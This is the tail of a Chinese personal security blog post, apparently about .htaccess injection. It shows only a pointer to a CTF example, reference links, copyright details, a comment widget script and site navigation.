<p>例题可看<a href="https://www.cnblogs.com/tr1ple/p/11439994.html" target="_blank" rel="noopener">X-NUCA-ezphp</a> </p>
<h1 id="0x4参考链接"><a href="#0x4参考链接" class="headerlink" title="0x4参考链接"></a>0x4参考链接</h1><p><a href="https://www.anquanke.com/post/id/205098" target="_blank" rel="noopener">https://www.anquanke.com/post/id/205098</a><br><a href="https://www.cnblogs.com/Wanghaoran-s1mple/p/13152075.html" target="_blank" rel="noopener">https://www.cnblogs.com/Wanghaoran-s1mple/p/13152075.html</a><br><a href="http://httpd.apache.org/docs/2.4/" target="_blank" rel="noopener">http://httpd.apache.org/docs/2.4/</a><br><a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet" target="_blank" rel="noopener">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a><br><a href="https://www.freebuf.com/vuls/218495.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218495.html</a></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/6b6ad1b0.html">https://blog.cfyqy.com/article/6b6ad1b0.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2]
}
var flag = false;
var gitFun = function () {
    try {
        var gitmentObj = window.GLOBAL_CONFIG.gitment;
        var gitment = new Gitment({
            id: decodeURI(title), // 可选。默认为 location.href
            owner: gitmentObj.owner,
            repo: gitmentObj.repo,
            oauth: {
                client_id: gitmentObj.client_id,
                client_secret: gitmentObj.client_secret
            },
        });
        gitment.render('comments-container');
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/8a65f310.html"><i class="fas fa-angle-left">&nbsp;</i><span>linux 常用命令记录</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/2b398cc5.html"><span>htaccess简识</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>